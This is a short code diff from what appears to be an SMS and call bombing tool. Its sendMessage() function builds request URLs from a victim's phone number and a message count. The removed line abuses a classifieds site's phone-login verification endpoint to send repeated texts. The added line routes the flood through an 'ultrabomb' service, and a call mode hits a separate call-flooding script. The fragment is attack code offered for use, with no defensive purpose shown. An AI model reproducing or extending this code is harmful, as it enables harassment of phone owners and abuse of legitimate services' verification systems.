@@ -54,7 +54,7 @@ function sendMessage() {
       // Choose the API URL based on the selected mode
       let apiUrl = "";
       if (currentMode === 'sms') {
-        apiUrl = `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${phone}&amount=${amount}`;
+        apiUrl = `https://mahfuz-ultrabomb.rf.gd/?phone=${phone}&amount=${amount}`;
       } else if (currentMode === 'call') {
         apiUrl = `http://mrn-bio.social-networking.me/cobraCll.php?num=${phone}`;
       }
